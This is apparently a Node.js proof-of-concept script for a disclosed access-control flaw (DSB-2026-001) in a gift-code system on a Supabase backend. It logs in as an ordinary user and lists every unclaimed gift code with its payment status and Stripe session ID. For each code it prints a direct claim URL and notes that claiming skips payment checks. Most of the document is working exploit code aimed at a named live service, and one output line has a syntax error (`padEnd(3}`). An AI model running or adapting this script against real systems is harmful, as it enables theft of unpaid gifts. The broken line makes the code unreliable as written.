#!/usr/bin/env node
// poc.js — Disband gift exposure PoC (DSB-2026-001)
// Language: JavaScript (Node >= 18, zero dependencies)
// READ-ONLY by design: enumerates exposed gift codes. Never claims anything.
//
// Usage:
//   node poc.js --url https://<project-ref>.supabase.co \
//                --key  <anon-key-from-client-bundle> \
//                --email <registered-user-email> --password <password>
//
// What it demonstrates:
//   1. Any authenticated user can read the `gifts` table via PostgREST.
//   2. Unclaimed (and possibly never-paid) gift codes are fully visible.
//   3. Every code is instantly claimable at https://www.disband.dev/gift/{code}
//      via the `claim_gift` RPC, which does not validate payment status.

const args = Object.fromEntries(
  process.argv.slice(2).map((a, i, arr) =>
    a.startsWith("--") ? [a.slice(2), arr[i + 1]] : []
  ).filter(p => p.length)
);
const required = ["url", "key", "email", "password"];
for (const r of required) {
  if (!args[r]) {
    console.error(`[!] missing --${r}`);
    console.error("    node poc.js --url <supabase-url> --key <anon-key> --email <user> --password <pass>");
    process.exit(1);
  }
}
const SUPA = args.url.replace(/\/$/, "");
const GIFT_PAGE = args.site || "https://www.disband.dev/gift/";

const hdr = (token) => ({
  apikey: args.key,
  authorization: `Bearer ${token || args.key}`,
  "content-type": "application/json",
});

const line = (s) => console.log(s);

(async () => {
  line("[*] DSB-2026-001 PoC — disband gift exposure");

  // 1. can the ANON key alone read the gift table?
  try {
    const anonR = await fetch(`${SUPA}/rest/v1/gifts?select=id&limit=1`, { headers: hdr() });
    line(anonR.status === 200
      ? "[!!] ANON key reads gifts directly — no account even needed"
      : `[*] anon read: ${anonR.status} (authenticated role required)`);
  } catch (e) {
    line(`[*] anon probe failed: ${e.message}`);
  }

  // 2. login as an ordinary registered user
  const login = await fetch(`${SUPA}/auth/v1/token?grant_type=password`, {
    method: "POST",
    headers: { apikey: args.key, "content-type": "application/json" },
    body: JSON.stringify({ email: args.email, password: args.password }),
  });
  if (login.status !== 200) {
    line(`[!] login failed (${login.status}) — credentials required for the authenticated variant`);
    process.exit(1);
  }
  const auth = await login.json();
  line(`[*] authenticated as: ${auth.user.id} (role: ${auth.user.role})`);

  // 3. enumerate the unclaimed gift inventory — codes, plans, payment state
  const gifts = await fetch(
    `${SUPA}/rest/v1/gifts?claimed_at=is.null&select=code,plan,months,amount_cents,status,stripe_session_id&order=created_at.asc`,
    { headers: hdr(auth.access_token) }
  );
  if (gifts.status !== 200) {
    line(`[!] gift read denied: ${gifts.status} — patched?`);
    process.exit(0);
  }
  const rows = await gifts.json();
  line(`[*] unclaimed gifts readable: ${rows.length}`);
  for (const g of rows) {
    line(
      `    ${g.code}  ${String(g.plan).padEnd(5)} ${String(g.months).padEnd(3}mo ` +
      `$${(g.amount_cents / 100).toFixed(2)}  ${g.status.padEnd(8)} ${GIFT_PAGE}${g.code}`
    );
  }

  // 4. the claimability conclusion
  const pending = rows.filter((r) => r.status !== "paid");
  line("");
  line(`[!] ${rows.length} codes exposed; ${pending.length} sit at "${pending[0]?.status}" — minted before payment capture.`);
  line("[!] claim_gift does not check stripe payment status — opening the link as any user claims it.");
  line("[!] PoC stops here by design. Nothing was claimed.");
})();
